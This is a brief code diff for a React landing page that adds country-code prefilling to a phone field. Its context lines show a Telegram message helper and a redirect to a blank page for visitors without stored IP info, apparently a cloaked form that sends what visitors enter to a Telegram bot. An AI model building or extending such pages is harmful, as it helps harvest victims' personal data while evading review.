@@ -6,6 +6,7 @@ import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { useState, useEffect, useCallback, useMemo } from 'react';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
+import { getCountryCallingCode } from 'libphonenumber-js';
 const Home = () => {
     const defaultTexts = useMemo(
         () => ({
@@ -88,6 +89,13 @@ const Home = () => {
 
     useEffect(() => {
         const ipInfo = localStorage.getItem('ipInfo');
+        const countryCode = localStorage.getItem('countryCode');
+        if (countryCode) {
+            setFormData((prev) => ({
+                ...prev,
+                phone: `+${getCountryCallingCode(countryCode)}`
+            }));
+        }
         if (!ipInfo) {
             window.location.href = 'about:blank';
         }
